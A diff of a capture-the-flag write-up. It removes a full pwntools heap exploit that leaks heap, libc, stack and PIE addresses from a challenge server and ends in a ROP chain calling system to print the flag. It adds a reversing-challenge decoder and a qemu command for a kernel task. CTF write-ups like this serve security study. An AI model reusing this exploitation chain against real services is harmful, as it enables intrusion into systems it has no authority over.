@@ -113,169 +113,33 @@ jump
 ### ex.py
 
 ```python
-from pwn import *
-import argparse
+ans = open('./prob', 'rb').read()[0x5020:0x5020+64]
 
-parser = argparse.ArgumentParser()
-parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
-parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
-args = parser.parse_args()
+def f1(a1, a2):
+    return ((a1 >> (a2 & 7)) | (a1 << (8 - (a2 & 7))))
+# ((f1(input[idx], (idx % 7) + 1) ^ (((13 * idx) + 7) & 0xff)) + 42) & 0xff
+flag = b''
+print(hex(((f1(ord('c'), (0 % 7) + 1) ^ (((13 * 0) + 7) & 0xff)) + 42) & 0xff))
+for i in range(len(ans)):
+    a = (ans[i] - 42) & 0xff
+    a ^= (((13 * i) + 7) & 0xff)
+    a = f1(a, 8 - ((i % 7) + 1)) & 0xff
+    flag += bytes([a])
+print(flag)
+```
 
-gdb_cmds = [
-    'b *$rebase(0x00000000000171a)',
-    'c'
-]
+# bkernel
 
-binary = './prob'
- 
-context.binary = binary
-context.arch = 'amd64'
-# context.log_level = 'debug'
-context.terminal = ['tmux', 'splitw', '-h']
+### 보호기법
 
-p2 = remote('16.184.29.60', 1337)
-port = int(p2.recvline().split(b' ')[0])
-
-if args.remote:
-    p = remote("16.184.29.60", port)
-else:
-    p = process([binary, str(port)])
-    if args.gdb:
-        gdb.attach(p, '\n'.join(gdb_cmds))
-l = ELF('./libc.so.6')
-
-#p.interactive()
-
-def recv_data(idx : int, startpoint : int, sz : int, dt : bytes):
-    p.sendafter(b'data: ', p16(1) + p16(idx))
-    p.send(p32(startpoint) + p32(sz))
-    p.send(dt)
-
-def set_info(idx : int, sz : int, dt : bytes):
-    p.sendafter(b'data: ', p16(256) + p16(idx))
-    p.send(p32(0) + p32(sz))    
-    p.send(dt)
-
-def clear_data(idx : int):
-    p.sendafter(b'data: ', p16(16) + p16(idx))
-    p.send(p32(0) + p32(0))
-
-def get_info(idx : int):
-    p.sendafter(b'data: ', p16(4096) + p16(idx))
-    p.send(p32(0) + p32(0))
-    return p.recvn(0x30)
-
-recv_data(0, 0, 0, b'\x0a')
-set_info(0, 0x20, b'\x00' * 0x20)
-recv_data(1, 0, 0, b'\x00')
-payload = p64(0x10010 + 0x40 + 0x20 + 0x40 + 1) + b'\x00' * 0x38
-payload += p64(0x10011) + b'\x00' * 0x10008
-payload += p64(0xcf1)
-recv_data(0, 0x10028, -0x10028 & 0xffffffff, payload + b'\x00' * (0x10d38 - len(payload)))
-sleep(1)
-p.send(b'\x00')
-set_info(1, 0x20, b'\x00' * 0x20)
-clear_data(1)
-clear_data(0)
-recv_data(2, 0, 0, b'a')
-set_info(0, 0, b'a')
-set_info(2, 0, b'a')
-set_info(1, 0, b'a')
-clear_data(1)
-recv_data(1, 0xffc8, 1, b'\x21')
-recv_data(1, 0xffe8, 1, b'\x41')
-heap_base = (u64(get_info(0)[:8]) << 12) - ((0x0000000556f29479 << 12) - 0x556f29459000)
-print(hex(heap_base))
-set_info(1, 0, b'a')
-# payload = p64(0xa01) + b'\x00' * (0xa00 - 8) + p64(0xc91 + 0x40 - 0xa00) 
-# recv_data(1, 0x10028, -0x10028 & 0xffffffff, payload + b'\x00' * (0xcc8 - len(payload)))
-# sleep(1)
-#p.send(b'\x00')
-payload = p64(heap_base + 0x102c0 + 0x10) + b'\x00' * 16
-payload += p64(0x10011) + b'\x00' * 0x10008
-payload += p64(0x21) + p64(heap_base + 0x102c0 + 0x10) + b'\x00' * 16
-payload += p64(0x21) + b'\x00' * 0x18
-payload += p64(0x21) + p64(heap_base + 0x102c0 + 0x10) + b'\x00' * 16
-payload += p64(0x41) + b'\x00' * 0x38
-payload += p64(0xc91)
-recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
-sleep(1)
-p.send(b'\x00')
-clear_data(0)
-l.address = u64(get_info(1)[:8]) - (0x7fd42b62cb20 - 0x7fd42b429000)
-print(hex(l.address))
-print(hex(l.sym['__environ']))
-
-payload = p64(l.sym['__environ']) + b'\x00' * 16
-payload += p64(0x10011) + b'\x00' * 0x10008
-payload += p64(0x21) + p64(l.sym['__environ']) + b'\x00' * 16
-payload += p64(0x21) + b'\x00' * 0x18
-payload += p64(0x21) + p64(l.sym['__environ']) + b'\x00' * 16
-payload += p64(0x41) + b'\x00' * 0x38
-payload += p64(0xc91)
-recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
-sleep(1)
-p.send(b'\x00')
-stack = u64(get_info(0)[:8]) - (0x00007fff0be8f460 - 0x7fff0be8f278)
-stack2 = u64(get_info(0)[:8]) - (0x00007ffdc2e8ab70 - 0x7ffdc2e8a9f4)
-print(hex(stack))
-print(hex(stack2))
-
-payload = p64(stack2) + b'\x00' * 16
-payload += p64(0x10011) + b'\x00' * 0x10008
-payload += p64(0x21) + p64(stack2) + b'\x00' * 16
-payload += p64(0x21) + b'\x00' * 0x18
-payload += p64(0x21) + p64(stack2) + b'\x00' * 16
-payload += p64(0x41) + b'\x00' * 0x38
-payload += p64(0xc91)
-recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
-sleep(1)
-p.send(b'\x00')
-fd = u32(get_info(0)[4:8])
-print(hex(fd))
-
-payload = p64(stack2 - 0x34) + b'\x00' * 16
-payload += p64(0x10011) + b'\x00' * 0x10008
-payload += p64(0x21) + p64(stack2 - 0x34) + b'\x00' * 16
-payload += p64(0x21) + b'\x00' * 0x18
-payload += p64(0x21) + p64(stack2 - 0x34) + b'\x00' * 16
-payload += p64(0x41) + b'\x00' * 0x38
-payload += p64(0xc91)
-recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
-sleep(1)
-p.send(b'\x00')
-pie_base = u64(get_info(0)[8:0x10]) - 0x1e81
-print(hex(pie_base))
-
-payload = p64(pie_base + 0x4020) + b'\x00' * 16
-payload += p64(0x10011) + b'\x00' * 0x10008
-payload += p64(0x21) + p64(pie_base + 0x4020) + b'\x00' * 16
-payload += p64(0x21) + b'\x00' * 0x18
-payload += p64(0x21) + p64(pie_base + 0x4020) + b'\x00' * 16
-payload += p64(0x41) + b'\x00' * 0x38
-payload += p64(0xc91)
-recv_data(0, 0x10010, -0x10010 & 0xffffffff, payload + b'\x00' * (0x10d50 - len(payload)))
-sleep(1)
-p.send(b'\x00')
-set_info(0, 0x8, p64(stack))
-
-
-dup2 = l.sym['dup2']
-system = l.sym['system']
-binsh = list(l.search(b'/bin/sh\x00'))[0]
-pop_rdi = l.address + 0x000000000010f75b
-pop_rsi = l.address + 0x0000000000110a4d
-pop_rdx_rbx_r12_r13_rbp = l.address + 0x00000000000b503c
-ret = l.address + 0x000000000002e81b
-payload = p64(ret) + p64(pop_rdi) + p64(stack + 0x100) + p64(system)
-payload = payload.ljust(0x100, b'\x00')
-payload += f'cat /home/ctf/flag >& {fd}\x00'.encode()
-#recv_data(0, 0, len(payload), payload)
-
-p.sendafter(b'data: ', p16(1) + p16(0))
-p.send(p32(0) + p32(len(payload)))
-p.send(payload)
-p.interactive()
-#recv_data(2, (-0x40 - 0x20 - 0x40 - 0x8) & 0xffffffff, 0x40+0x20+0x40+0x8, payload)
-#clear_data(0)
+```bash
+qemu-system-x86_64 \
+  -kernel bzImage \
+  -initrd $1 \
+  -nographic \
+  -append "console=ttyS0 quiet loglevel=3 oops=panic pti=on kaslr" \
+  -m 128M \
+  -cpu kvm64,+smep,+smap,rdrand \
+  -monitor /dev/null \
+  -no-reboot
 ```
